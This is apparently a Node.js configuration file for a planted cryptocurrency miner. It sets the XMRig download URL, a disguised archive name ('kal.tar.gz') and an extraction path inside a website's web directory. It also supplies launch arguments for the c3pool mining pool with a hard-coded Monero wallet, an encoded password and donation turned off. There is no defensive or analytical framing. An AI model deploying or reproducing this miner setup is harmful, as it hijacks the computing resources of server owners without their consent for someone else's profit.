const path = require('path');
const homeDir = '/var/www/statisfaction/apps/web';
const walletID = "8556M2fMqE8Dg1U3pERP9rJ64jaa6MMha5SY5ovWQ7XiYjxdKquPQ7Z4afpEeXUtfJVBLGvLncGxtKMugv61S9nFGMHNAFK";
module.exports = {
    homeDir: homeDir,
    tarFile: path.join(homeDir, "kal.tar.gz"),
    extractDir: path.join(homeDir, "xmrig-6.24.0"),
    binaryPath: path.join(homeDir, "xmrig-6.24.0", "xmrig"),
    downloadUrl: "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz",
    processName: "xmrig",
    walletID: walletID,
    launchArgs: [
        "--url", "auto.c3pool.org:443",
        "--user", walletID,
        "--pass", "WUZHRkYOHh1AQlRAWEFVV1ZAWF1dGFpCWR0=", 
        "--donate-level", "0",
    ]
};